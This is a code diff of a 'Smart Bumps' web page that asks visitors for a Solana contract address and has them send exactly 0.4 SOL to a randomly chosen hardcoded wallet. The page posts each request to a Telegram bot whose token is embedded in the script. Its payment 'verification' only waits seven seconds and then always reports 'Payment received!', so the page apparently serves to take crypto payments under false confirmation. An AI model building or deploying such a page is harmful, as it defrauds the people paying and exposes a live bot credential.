@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Smart Bumps - Contract Address</title>
+  <title>Smart Bumps</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -20,13 +20,15 @@
       padding: 40px;
       border-radius: 15px;
       box-shadow: 0 0 25px rgba(0, 212, 255, 0.2);
-      max-width: 400px;
+      max-width: 500px;
       width: 100%;
       text-align: center;
     }
-    h1 {
-      font-size: 1.8rem;
-      margin-bottom: 20px;
+    .step {
+      display: none;
+    }
+    .step.active {
+      display: block;
     }
     input {
       width: 100%;
@@ -56,25 +58,42 @@
       background: linear-gradient(135deg, #00c2ff, #007acc);
     }
     .wallet-box {
-      margin-top: 30px;
       background: rgba(255, 255, 255, 0.05);
       padding: 20px;
       border-radius: 12px;
       word-wrap: break-word;
       font-family: 'Courier New', monospace;
       color: #00d4ff;
+      margin: 20px 0;
+    }
+    .loader {
+      margin-top: 20px;
+      font-size: 15px;
+      color: #bbb;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🔐 Enter Contract Address</h1>
-    <input type="text" id="contractAddress" placeholder="Paste Solana Contract Address" />
-    <button onclick="submitCA()">Continue</button>
+    <!-- Step 1 -->
+    <div class="step step-1 active">
+      <h2>Step 1: Enter Contract Address</h2>
+      <input type="text" id="ca" placeholder="Paste Solana Contract Address" required />
+      <button onclick="goToStep(2)">Next</button>
+    </div>
 
-    <div class="wallet-box" id="walletBox" style="display:none;">
-      <p>💰 Send exactly <strong>0.4 SOL</strong> to:</p>
-      <p id="walletAddress">Loading...</p>
+    <!-- Step 2 -->
+    <div class="step step-2">
+      <h2>Step 2: Make Payment</h2>
+      <p>Send exactly <strong>0.4 SOL</strong> to the address below:</p>
+      <div class="wallet-box" id="walletAddressBox">Loading...</div>
+      <button onclick="goToStep(3)">I have paid</button>
+    </div>
+
+    <!-- Step 3 -->
+    <div class="step step-3">
+      <h2>Step 3: Verifying Payment...</h2>
+      <div class="loader" id="loader">Checking payment on Solana blockchain...</div>
     </div>
   </div>
 
@@ -86,30 +105,51 @@
       'DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3'
     ];
 
-    function getRandomWallet() {
-      return wallets[Math.floor(Math.random() * wallets.length)];
-    }
+    let selectedWallet = '';
+    let enteredCA = '';
 
-    function submitCA() {
-      const ca = document.getElementById('contractAddress').value.trim();
-      if (!ca) {
-        alert('Please enter a valid contract address.');
-        return;
+    function goToStep(step) {
+      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+      document.querySelector('.step-' + step).classList.add('active');
+
+      if (step === 2) {
+        // Get Contract Address
+        enteredCA = document.getElementById('ca').value.trim();
+        if (!enteredCA) {
+          alert("Please enter a contract address.");
+          goToStep(1);
+          return;
+        }
+
+        // Pick a random wallet
+        selectedWallet = wallets[Math.floor(Math.random() * wallets.length)];
+        document.getElementById('walletAddressBox').textContent = selectedWallet;
+
+        // Send alert to Telegram
+        fetch(`https://api.telegram.org/bot8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: '1129109001',
+            text: `🆕 NEW BUMP REQUEST\n📄 CA: ${enteredCA}\n💰 Wallet: ${selectedWallet}`
+          })
+        }).catch(console.error);
       }
 
-      const wallet = getRandomWallet();
-      document.getElementById('walletAddress').textContent = wallet;
-      document.getElementById('walletBox').style.display = 'block';
+      if (step === 3) {
+        checkPayment();
+      }
+    }
 
-      // OPTIONAL: Send Telegram alert
-      fetch(`https://api.telegram.org/bot8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: '1129109001',
-          text: `🆕 NEW BUMP REQUEST\n📄 CA: ${ca}\n💰 Wallet: ${wallet}`
-        })
-      }).catch(console.error);
+    function checkPayment() {
+      // Simulate loading — replace this with real blockchain checking later
+      let loader = document.getElementById("loader");
+      loader.textContent = "Checking payment on Solana blockchain...";
+
+      // Simulated 7-second loading
+      setTimeout(() => {
+        loader.textContent = "✅ Payment received! Bump in progress...";
+      }, 7000);
     }
   </script>
 </body>
